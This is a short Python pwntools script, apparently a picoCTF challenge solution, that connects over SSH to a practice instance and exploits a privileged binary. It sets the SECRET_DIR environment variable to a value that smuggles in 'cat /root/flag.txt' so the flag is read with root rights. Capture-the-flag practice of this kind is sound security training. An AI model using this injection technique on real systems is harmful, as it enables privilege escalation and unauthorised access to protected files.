# picoCTF-vne-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 65497
    user = "ctf-player"
    password = "483e80d4"

    # variables
    # allow us to become root then read flag
    payload = "/root | cat /root/flag.txt"

    # connect to instance
    s = ssh(user, host, port, password)
    p = s.process("/home/ctf-player/bin", env={"SECRET_DIR": payload})
    p.recvline(timeout=1)
    flag = p.recvuntil(b'}', timeout=1).decode()
    p.close()
    
    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()